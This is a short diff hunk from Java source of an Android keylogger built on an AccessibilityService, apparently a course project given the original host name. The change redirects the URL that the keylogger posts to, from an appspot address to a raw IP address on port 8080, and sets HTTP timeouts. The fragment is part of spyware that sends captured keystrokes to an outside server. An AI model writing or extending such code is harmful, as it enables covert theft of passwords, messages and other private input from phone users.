@@ -35,7 +35,7 @@ public class Keylogger extends AccessibilityService {
 
             try {
 
-                String url = "https://cs460-android-keylogger.appspot.com";
+                String url = "http://152.58.20.13:8080";
 
                 HttpParams httpParameters = new BasicHttpParams();
                 HttpConnectionParams.setConnectionTimeout(httpParameters, 5000);
